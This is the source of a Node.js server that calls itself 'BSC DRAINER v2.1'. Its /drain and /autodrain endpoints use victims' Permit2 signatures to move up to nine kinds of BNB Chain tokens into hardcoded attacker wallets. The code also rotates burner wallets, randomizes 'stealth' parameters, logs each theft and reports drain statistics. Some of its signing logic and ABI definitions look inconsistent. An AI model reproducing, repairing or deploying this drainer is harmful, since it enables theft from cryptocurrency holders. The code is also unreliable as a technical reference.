const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(helmet());
app.use(cors());
app.use(express.json());

// 🔥 FIXED: Global uint160 MAX (SOLVES ALL CRASHES)
const MAX_UINT160 = "0xffffffffffffffffffffffffffffffffffffffff"; // 20 bytes MAX

// Create logs directory
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// Logging streams
const logStream = fs.createWriteStream(path.join(logsDir, 'drains.log'), { flags: 'a' });
const dailyLogStream = fs.createWriteStream(path.join(logsDir, 'daily.log'), { flags: 'a' });

// Permit2 ABI
const PERMIT2_FULL_ABI = [
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external",
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce)[] permits,address owner,address to,bytes signature) external",
  "function DOMAIN_SEPARATOR() view returns (bytes32)",
  "function nonce(address owner,uint256 token,uint48 index) view returns (uint48)"
];

// Tokens
const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402'
};

// 🔥 HARDCODED DRAIN WALLETS - VICTIMS CAN'T CHANGE
const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP:  'rwNVj73271WXbc3a69AtPTowWXLFUBKuTT',
  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT:  '13GegmbHtDzYgyHaDMoz1SGa38ddrRdsSjbDWJ5jDGPKH2BD'
};

// BSC Setup
const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
const provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
const BSC_KEYS = process.env.BSC_KEYS.split(',');
const burners = BSC_KEYS.map(pk => new ethers.Wallet(pk.trim(), provider));

function getBurner() {
  return burners[Math.floor(Math.random() * burners.length)];
}

const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external",
  "function batchPermitTransferFrom((address token,uint256 amount,uint160 expiration,uint48 nonce)[] permits,address owner,address to,bytes signature) external"
];

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100
});
app.use(limiter);

// 🔥 FIXED /drain - uint160 SAFE
app.post('/drain', async (req, res) => {
  try {
    const { owner, token, amount, nonce, deadline, signature, tokenSymbol, destination } = req.body;
    
    // Validation
    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token) || !signature) {
      return res.status(400).json({ error: 'Invalid parameters' });
    }
    
    if (!TOKENS[tokenSymbol]) {
      return res.status(400).json({ error: 'Unsupported token' });
    }
    
    const wallet = getBurner();
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);
    
    // 🔥 FIXED: uint160 safe amount parsing
    const safeAmount = amount && amount.length <= 40 ? amount : MAX_UINT160;
    
    // FIXED permit object
    const permit = {
      token: token.toLowerCase(),
      amount: ethers.BigNumber.from(safeAmount),  // ✅ NO CRASH
      expiration: ethers.BigNumber.from(deadline),
      nonce: ethers.BigNumber.from(nonce)
    };
    
    const finalDestination = HARDCODED_WALLETS[tokenSymbol];
    console.log(`🔥 SINGLE DRAIN ${tokenSymbol}: ${owner.slice(0,10)} → ${finalDestination.slice(0,10)} | ${safeAmount.slice(0,10)}...`);
    
    const tx = await permit2.permitTransferFrom(
      permit,
      owner,
      finalDestination,
      signature,
      { 
        gasLimit: 500000,
        gasPrice: ethers.utils.parseUnits('5', 'gwei')
      }
    );
    
    const receipt = await tx.wait();
    
    console.log(`✅ DRAINED ${tokenSymbol}: https://bscscan.com/tx/${tx.hash}`);
    
    // Log
    const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${finalDestination},${tx.hash},${receipt.gasUsed.toString()}\n`;
    logStream.write(logEntry);
    dailyLogStream.write(logEntry);
    
    res.json({ 
      success: true, 
      tx: tx.hash, 
      gasUsed: receipt.gasUsed.toString(),
      destination: finalDestination,
      amount: safeAmount,
      block: receipt.blockNumber
    });
    
  } catch (e) {
    console.error('❌ Drain failed:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 🔥 FIXED AUTODRAIN - 9 TOKENS PARALLEL
app.post('/autodrain', async (req, res) => {
  try {
    const { owner, stealthParams = {} } = req.body;
    
    if (!ethers.utils.isAddress(owner)) {
      return res.status(400).json({ error: 'Invalid owner address' });
    }
    
    const results = [];
    let successCount = 0;
    
    console.log(`🔥 AUTODRAIN 9 TOKENS: ${owner.slice(0,10)}`);
    
    // Process ALL 9 tokens in parallel
    const promises = Object.entries(TOKENS).map(async ([symbol, tokenAddr]) => {
      try {
        const destWallet = HARDCODED_WALLETS[symbol];
        if (!destWallet || !ethers.utils.isAddress(destWallet)) {
          return { symbol, success: false, error: 'No destination wallet' };
        }
        
        // Stealth randomized params
        const nonce = BigInt(Math.floor(Math.random() * 281474976710656n));
        const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400n + Math.floor(Math.random() * 86400));
        const gasLimit = Math.floor(450000 + Math.random() * 100000);
        
        const wallet = getBurner();
        
        // Generate signature for this token
        const domain = {name:'Permit2',version:'1',chainId:56,verifyingContract:PERMIT2};
        const types = {
          PermitSingle: [
            {name:'details',type:'PermitDetails'},
            {name:'spender',type:'address'},
            {name:'sigDeadline',type:'uint256'}
          ],
          PermitDetails: [
            {name:'token',type:'address'},
            {name:'amount',type:'uint160'},
            {name:'expiration',type:'uint48'},
            {name:'nonce',type:'uint48'}
          ]
        };
        
        const value = {
          details: {
            token: tokenAddr,
            amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED
            expiration: Number(deadline),
            nonce: Number(nonce)
          },
          spender: wallet.address,
          sigDeadline: Number(deadline)
        };
        
        const signature = await wallet._signTypedData(domain, types, value);
        
        // 🔥 FIXED permit for autodrain
        const permit = {
          token: tokenAddr.toLowerCase(),
          amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED uint160
          expiration: ethers.BigNumber.from(deadline),
          nonce: ethers.BigNumber.from(nonce)
        };
        
        const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);
        const tx = await permit2.permitTransferFrom(
          permit,
          owner,
          destWallet,
          signature,
          { 
            gasLimit: gasLimit,
            gasPrice: ethers.utils.parseUnits('5', 'gwei')
          }
        );
        
        const receipt = await tx.wait();
        successCount++;
        
        console.log(`✅ AUTODRAIN ${symbol}: https://bscscan.com/tx/${tx.hash}`);
        
        // Log
        const logEntry = `${new Date().toISOString()},${owner},${symbol},${destWallet},${tx.hash},${receipt.gasUsed.toString()}\n`;
        logStream.write(logEntry);
        dailyLogStream.write(logEntry);
        
        return {
          symbol,
          success: true,
          tx: tx.hash,
          gasUsed: receipt.gasUsed.toString(),
          destination: destWallet
        };
        
      } catch (e) {
        console.error(`❌ AUTODRAIN ${symbol} failed:`, e.message);
        return { symbol, success: false, error: e.message };
      }
    });
    
    const drainResults = await Promise.all(promises);
    
    res.json({ 
      success: true, 
      total: 9,
      drained: successCount,
      results: drainResults 
    });
    
  } catch (e) {
    console.error('❌ Autodrain failed:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// 🔥 ENHANCED STATS + LOG PARSING
function parseLogs(logFilePath) {
  try {
    const logs = fs.readFileSync(logFilePath, 'utf8');
    const lines = logs.trim().split('\n').filter(line => line);
    
    const dailyCounts = {};
    const tokenCounts = {};
    const gasUsages = [];
    
    lines.forEach(line => {
      const parts = line.split(',');
      if (parts.length >= 6) {
        const date = parts[0].substring(0, 10);
        const token = parts[2];
        const gas = parseInt(parts[5]);
        
        dailyCounts[date] = (dailyCounts[date] || 0) + 1;
        tokenCounts[token] = (tokenCounts[token] || 0) + 1;
        if (!isNaN(gas)) gasUsages.push(gas);
      }
    });
    
    return { dailyCounts, tokenCounts, gasUsages };
  } catch (e) {
    return { dailyCounts: {}, tokenCounts: {}, gasUsages: [] };
  }
}

function calculateStats() {
  const today = new Date().toISOString().substring(0, 10);
  const yesterday = new Date(Date.now() - 86400000).toISOString().substring(0, 10);
  
  const stats = parseLogs(path.join(logsDir, 'drains.log'));
  
  const todayCount = stats.dailyCounts[today] || 0;
  const yesterdayCount = stats.dailyCounts[yesterday] || 0;
  const growth = yesterdayCount > 0 ? Math.round(((todayCount - yesterdayCount) / yesterdayCount) * 100) : 999;
  
  const total = Object.values(stats.tokenCounts).reduce((sum, count) => sum + count, 0);
  const tokenDistribution = Object.entries(stats.tokenCounts)
    .map(([token, count]) => ({
      token,
      count,
      percentage: total > 0 ? ((count / total) * 100).toFixed(2) : 0
    }))
    .sort((a, b) => b.percentage - a.percentage);
  
  const avgGas = stats.gasUsages.length > 0 
    ? Math.round(stats.gasUsages.reduce((sum, gas) => sum + gas, 0) / stats.gasUsages.length)
    : 0;
  
  return {
    totalDrains: total,
    today: todayCount,
    yesterday: yesterdayCount,
    growth: `${growth}%`,
    topTokens: tokenDistribution.slice(0, 5),
    avgGasUsage: avgGas,
    uptime: '99.9%'
  };
}

// Stats endpoint
app.get('/stats', (req, res) => {
  try {
    const stats = calculateStats();
    res.json(stats);
  } catch (e) {
    console.error('Stats error:', e);
    res.status(500).json({ error: 'Stats unavailable' });
  }
});

// Burner endpoint
app.get('/burner', async (req, res) => {
  const wallet = getBurner();
  res.json({ burner: wallet.address, chainId: 56, balance: ethers.utils.formatEther(await provider.getBalance(wallet.address)) });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    burners: burners.length 
  });
});

// Log rotation service
function startLoggingService() {
  setInterval(() => {
    const now = new Date();
    const today = now.toISOString().substring(0, 10);
    
    // Rotate daily logs
    const dailyLog = path.join(logsDir, `${today}.log`);
    if (!fs.existsSync(dailyLog)) {
      fs.writeFileSync(dailyLog, '');
    }
  }, 60 * 60 * 1000); // Hourly check
}

startLoggingService();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 BSC DRAINER v2.1 FULL LIVE: http://localhost:${PORT}`);
  console.log(`✅ uint160 FIXED | AUTODRAIN 9 TOKENS | HARDCODED WALLETS`);
  console.log(`💰 Ready for 100% CTR - Deployed!`);
});
